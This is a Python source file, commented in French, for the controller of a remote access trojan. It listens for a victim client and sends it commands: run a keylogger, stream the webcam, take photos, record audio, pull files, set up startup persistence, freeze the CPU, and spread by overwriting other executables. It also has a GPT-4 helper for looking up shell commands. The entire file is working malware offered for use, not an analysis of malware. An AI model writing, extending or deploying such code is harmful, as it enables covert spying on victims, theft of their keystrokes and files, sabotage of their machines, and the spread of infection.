import threading
import cv2
import numpy as np
import socket
import subprocess
import openai
import time


openai.api_key = 'YOUR API KEY'


def get_terminal_command(question):
    message = [{"role": "user", "content": question}]
    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=message,
        temperature=0.2,
        max_tokens=1000,
        frequency_penalty=0.0
    )

    return response.choices[0].message['content']


def show_help():
    help_text = '''
Commandes disponibles :
    cd <chemin>               : Changer le répertoire courant.
    start_logger              : Démarrer le logger.
    stop_logger               : Arrêter le logger et envoyer le fichier sauvegardé au serveur.
    start_webcam              : Démarrer la webcam et envoyer les images au serveur.
    stop_webcam               : Arrêter la webcam.
    take_photo                : Prendre une photo avec la webcam et la sauvegarder sur le serveur.
    record_audio <duree>      : Enregistrer un audio depuis le microphone du client pendant une durée spécifiée en seconde et l'envoyer au serveur.
    create_persistence        : Créer une persistance du script au redémarrage du PC.
    start_rdp <adresse>       : Démarrer une session RDP à l'adresse spécifiée.
    stop_connection           : Arrêter la connexion.
    gpt <question>            : Faire un appel à GPT-4 pour rechercher des commandes shell et PowerShell ou répondre à toute autre question.
    copy_file <fichier>       : Copier le fichier spécifié du client vers le serveur.
    kill                      : Saturation du processeur du client (PC inutilisable).
    infecte                   : Duplique l'exécutable actuel dans tous les autres exécutables du répertoire courant et les place dans le répertoire de démarrage.
    help                      : Afficher cette liste d'aide.
'''
    return help_text


def recvall(sock, count):
    buf = b''
    while count:
        newbuf = sock.recv(count)
        if not newbuf:
            return None
        buf += newbuf
        count -= len(newbuf)
    return buf


def save_photo(conn):
    data = conn.recv(1024)
    photo_data = b''
    while data:
        photo_data += data
        data = conn.recv(1024)
        if len(data) < 1024:
            break
    nparr = np.frombuffer(photo_data, np.uint8)
    if nparr.size > 0:  
        frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if frame is not None:  
            filename = time.strftime("%d%m%y-%H-%M") + 'webcam_photo.jpg'
            cv2.imwrite(filename, frame)
            print("Photo sauvegardée sous " + filename + ".")
        else:
            print("Erreur lors de la décodage de l'image")
    else:
        print("Erreur lors de la réception de l'image")


def webcam_thread(conn, webcam_running):
    while webcam_running.is_set():
        frame_data = b''
        while True and webcam_running.is_set():
            data = conn.recv(1024)
            frame_data += data
            if b"END_OF_FRAME" in frame_data:
                # Deletes the end of frame delimiter
                frame_data = frame_data[:-12]
                break

        nparr = np.frombuffer(frame_data, np.uint8)
        if nparr.size > 0:  
            frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
            if frame is not None:  
                cv2.imshow('Webcam', frame)
                cv2.waitKey(1)

    cv2.destroyAllWindows()

def handle_command(connexion, commande):
    connexion.sendall(commande.encode())
    donnees = connexion.recv(1024)
    print(donnees.decode('cp1252', errors='replace'))
    
def infecte(connexion, commande):
    connexion.sendall(commande.encode())
    donnees = connexion.recv(1024)
    print(donnees.decode('cp1252', errors='replace'))

adresse_hote = '10.29.126.30'
port = 4567

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((adresse_hote, port))
    s.listen(5)
    print(f"Écoute sur {adresse_hote}:{port}...")

    connexion, adresse = s.accept()
    with connexion:
        print(f"Connecté à {adresse}")
        webcam_running = threading.Event()
        while True:
            commande = ""
            commande = input("Entrez une commande : ")
            donnees = None

            match commande.lower():
                case 'help': #display the help menu
                    print(show_help())
                    continue
                case 'start_logger': #starts the keylogger
                    connexion.sendall(commande.encode())
                    print("logger démarré.")
                    continue
                case 'stop_logger': #stop the keylogger and saves the logged file 
                    connexion.sendall(commande.encode())
                    print("logger arrêté.")
                    filename = time.strftime("%d%m%y-%H-%M") + "_logger_output.txt"
                    logfile = open(filename, "wb")
                    while True:
                        data = connexion.recv(1024)
                        if data.endswith(b"LOGGER_END"):
                            logfile.write(data[:-12])
                            break
                        logfile.write(data)
                    logfile.close()
                    print("Fichier " + filename + " sauvegardé.")
                    continue
                case 'start_webcam': #starts the webcam
                    webcam_running.set()
                    threading.Thread(target=webcam_thread, args=(
                        connexion, webcam_running)).start()
                    connexion.sendall(commande.encode())
                case 'stop_webcam': #stop the webcam
                    webcam_running.clear()
                    connexion.sendall(commande.encode()) 
                case s if s.startswith('start_rdp'):
                    try:
                        rdp_address = commande.split(' ')[1]
                        command_to_execute = f'mstsc /v:{rdp_address}'
                        subprocess.Popen(command_to_execute, shell=True)
                        print(f"RDP session started for: {rdp_address}")
                    except Exception as e:
                        print(s, f"Error: {str(e)}")
                case 'take_photo': #take a photo with the client's camera 
                    connexion.sendall(commande.encode())
                    save_photo(connexion)
                case s if s.startswith('GPT'): #ask gpt questions
                    question = commande.split(' ', 1)[1]
                    terminal_command = get_terminal_command(question)
                    print(f"Réponse : \n\n {terminal_command}")
                case s if s.startswith('record_audio'):
                    connexion.sendall(commande.encode())
                    audio_data = b''
                    while True:
                        data = connexion.recv(1024)
                        # Check the end of audio signal
                        if data.endswith(b"END_OF_AUDIO"):
                            # Remove end of data signal
                            audio_data += data[:-12]
                            break
                        audio_data += data
                    with open('audio.wav', 'wb') as f:
                        f.write(audio_data)
                    print("Audio sauvegardé sous 'audio.wav'.") 
                case s if s.startswith('copy_file'): #download a file from the client
                    try:
                        connexion.sendall(commande.encode())
                        file_name = commande.split(' ')[1]
                        with open(file_name, 'wb') as f:
                            print(f'Receiving {file_name}...')
                            while True:
                                data = connexion.recv(1024)
                                if data.startswith(b"Erreur lors de l'envoi du fichier :"):
                                    # recieved client error handling
                                    print("Erreur reçue du client :", data.decode())
                                    break
                                # Check file last caracters
                                elif data.endswith(b"END_OF_FILE"):
                                    # Remove end of data signal
                                    f.write(data[:-12])
                                    break
                                f.write(data)
                        print(f"{file_name} received successfully.")
                    except Exception as e:
                        print(f"Erreur lors de la réception du fichier : {str(e)}") 
                case 'infecter': #spread the excutable
                    threading.Thread(target=infecte, args=(connexion, commande)).start()
                case s if commande != '' : #restart command prompt
                     threading.Thread(target=handle_command, args=(connexion, commande)).start()         